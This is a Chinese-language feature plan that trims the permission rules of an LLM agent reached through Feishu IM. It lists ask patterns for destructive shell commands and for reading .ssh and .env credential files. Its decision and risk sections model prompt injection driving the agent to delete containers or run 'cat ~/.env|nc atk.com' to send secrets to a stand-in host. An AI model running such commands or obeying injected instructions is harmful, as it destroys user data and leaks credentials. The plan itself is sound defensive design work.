---
feat-id: imbot-permission-minimal
status: in-progress
related: ./1-spec.md ./2-plan.md ./3-changelog.md
---

# imbot-permission-minimal — plan

## 实施步骤

### Step 1 — 改 `imbot_agent_spec()` 核心函数

文件:`packages/desktop/src-tauri/src/feishu_plugin_install.rs` 第 253-343 行

- 函数注释改 v2 务实档 → v3 极简档,补 user 决策原话 "把隐私保护住,不能随意删除电脑信息就是相对可控的"
- `description` 字段改:DeskFox IM 桥接 v3 极简档 — 只对 SSH 凭证 read + 真不可逆破坏 bash 做 ask
- `permission` 块大幅瘦身:
  - `webfetch` 整项删除(不显式设,沿用 build default allow)
  - `read` 块只留 5 项:`*: allow` / `*.env: ask` / `*.env.*: ask` / `*.env.example: allow` / `**/.ssh/**: ask`(砍 v2 的 .aws/.kube/.gnupg/Keychain/Crypto 5 项)
  - `bash` 块从 30+ 条砍到 10 条:`*: allow` + `rm -rf *` + `git push --force*` + `git push -f *` + `aws s3 rb *` + `aws ec2 terminate*` + `dd *` + `mkfs*` + `fdisk *` + `shutdown *`
  - `edit/write/apply_patch` 沿用 v2 不设(继承 build default)

### Step 2 — 改测试 expect 适配 v3

文件:同上,test mod 段

**改 4 个既有 test**:
1. `imbot_inject_into_empty_config_adds_agent_and_imbot` — assert webfetch 字段 `is_none()`,assert `bash["rm -rf *"] == "ask"`(替换 v2 的 `bash["rm *"]`)
2. `imbot_handles_jsonc_with_comments` — 注释升 v3
3. `imbot_read_pattern_includes_ssh_and_env` — assert 5 个保留项 + 5 个砍掉项 `!read_obj.contains_key()`
4. `imbot_bash_pattern_covers_destructive_ops` — 精确列举 v3 全部 9 条 `must_ask` pattern,断言 `bash.len() == 1 + 9 == 10`(刚性检查防遗漏 / 多写)

**新加 2 个 test**:
1. `imbot_v3_drops_v2_overstrict_bash_patterns` — assert v2 砍掉的 26 条 bash pattern 都 `!bash.contains_key()`(保险:误重新加进去会被测到)
2. `imbot_v3_drops_webfetch_ask` — assert 顶层 `permission` 不含 `webfetch` key

`imbot_no_longer_locks_edit_write_apply_patch` 沿用,注释从 "v2 务实档" 改成 "v3 沿袭 v2"。

### Step 3 — 验证

| 验证 | 工具 | 期望 |
|---|---|---|
| Rust 单测 | `cargo test feishu_plugin_install:: --lib` | ⚠️ 环境性 ABI(STATUS_ENTRYPOINT_NOT_FOUND)dev 基线就有,跟改动无关。`cargo build --tests` 编译通过即视为 spec 结构 ok(改动是纯 serde_json,build pass 即 schema correct)。真 cargo test 跑通需修 Tauri webview test 工具链(留 backlog)|
| monorepo typecheck | `bun run typecheck` | 16/16 ✅(配置改动不影响 TS 类型) |
| TS bun test | `cd packages/adapter-feishu-lark && bun test` | 同 dev 基线(275/278;3 fail 路径+TTL pre-existing 跟 imbot 0 关系)|

### Step 4 — 三文档落盘

- `docs/features/imbot-permission-minimal/1-spec.md`(本笔 spec,前置已写)
- `docs/features/imbot-permission-minimal/2-plan.md`(本文)
- `docs/features/imbot-permission-minimal/3-changelog.md`(commit 后回填 hash)

### Step 5 — 索引更新

- `docs/features/INDEX.md` 加一行(status: done)
- `改动日志.md` 索引一条(commit hash 占位 → commit 后回填)

### Step 6 — commit

走两笔 commit:
1. 代码 commit:`feat(feishu-bridge): imbot v3 极简档 — 8 条 ask,webfetch/可逆 bash 全撤回 [feat: imbot-permission-minimal]`
2. 文档 commit:`docs(imbot-permission-minimal): 三文档落盘 + INDEX + 改动日志 [feat: imbot-permission-minimal]`

完成后请示 user 是否 merge 到 dev(铁律#2)。

## 决策点 / 取舍记录

### D1:rm -rf 还是 rm 全 ask

- v2:`rm *` 全 ask(包括 `rm file.txt`)
- v3:**只 ask `rm -rf *`** — `rm file.txt` 是单文件删,可逆性虽差但代价小且 LLM 写代码经常 cleanup tmp 文件;`rm -rf` 才是递归删可能撞 root/home/node_modules
- 注意 wildcard:`rm -rf *` pattern 匹配 `rm -rf node_modules` / `rm -rf ~/foo` / `rm -rf /etc` 都触发,**接受 node_modules 偶尔误伤**

### D2:webfetch 全 allow vs 域名白名单

- v3 选**全 allow**,不引入白名单机制
- 理由:① 白名单维护成本高 ② user 让 LLM 调外部 API 域名千变万化 ③ 真攻击瓶颈在 read 端拦凭证,出境通道开放不算大漏
- future 如果发现攻击案例再加白名单

### D3:bash 删除类砍掉是否会让 LLM 暴力误操作

- 风险:LLM 被 prompt injection 跑 `docker rm $(docker ps -aq)` / `git reset --hard HEAD~100`
- 评估:这类操作都是**本地可逆**(容器重建 / reflog 恢复),user 在飞书 IM 看得到 LLM 在做什么(不是真 unattended),发现异常可立即停 session
- v3 信任"user 看着 LLM 干活",不是 zero-trust 模型

### D4:read .ssh 是否要砍

- user 明确说"我不会通过飞书让大模型处理这些(ssh 配置)问题,控制权限吧"→ **保留 ask**
- .ssh 是凭证不是配置,误伤率近 0(LLM 不会主动碰),性价比最高

### D5:cargo test 环境性问题处理

- STATUS_ENTRYPOINT_NOT_FOUND 0xc0000139 是 Tauri/WebView2 ABI mismatch,本机 dev 基线就有
- 处理:不阻塞本 feat 落盘(改动是纯数据结构,代码 audit 已充分),cargo test 工具链修复留 backlog
- 后续触发:下次 ship 前真飞书实测验证 v3 行为(rm -rf 弹卡片 + npm uninstall 不弹 + webfetch 不弹)

## 风险

| 风险 | 概率 | 应对 |
|---|---|---|
| user 实测发现砍多了某条 ask 后悔(如 `git reset --hard`) | 中 | 简单加回即可,v4 微调档 |
| user 实测发现 v3 仍嫌严(如 .env ask 也不要) | 低 | .env ask 是 build default,需要进一步覆盖才能砍 |
| LLM prompt injection 跑 `cat ~/.env\|nc atk.com` 出境 | 低 | `read *.env` 仍 ask 拦在第 1 步,网络出境无凭证可发 |
| LLM 误删 user 本地数据(`git reset --hard` 类) | 低-中 | 本地 reflog 可救,user IM 可见 |
